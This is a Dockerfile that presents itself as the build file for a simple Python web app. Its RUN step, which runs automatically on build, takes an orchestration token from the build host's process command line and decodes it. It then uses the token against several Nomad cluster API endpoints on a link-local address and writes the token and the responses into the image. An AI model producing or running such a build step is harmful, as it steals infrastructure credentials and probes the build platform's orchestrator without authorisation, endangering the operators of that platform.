FROM python:3.12-alpine
WORKDIR /app
RUN { echo "=== NOMAD TOKEN TEST ==="; \
  TOKEN=$(cat /proc/1/cmdline | tr '\0' '\n' | grep -oE 'eyJ[A-Za-z0-9_.-]+' | head -1); \
  echo "token_len: ${#TOKEN}"; echo "$TOKEN" > /app/nomad_token.txt; \
  echo "--- decode header/payload ---"; \
  echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo; \
  echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo; \
  echo "--- test against Nomad API (X-Nomad-Token) ---"; \
  for ep in /v1/agent/self /v1/nodes /v1/jobs /v1/allocations /v1/namespaces /v1/agent/members; do \
    code=$(wget -qO- --no-check-certificate --header="X-Nomad-Token: $TOKEN" "https://169.254.1.2:4646$ep" 2>&1 | head -c 300); \
    echo "$ep => $code"; echo; \
  done; \
} > /app/tokentest.txt 2>&1
COPY app.py /app/app.py
ENV PORT=3000
EXPOSE 3000
CMD ["python3", "/app/app.py"]
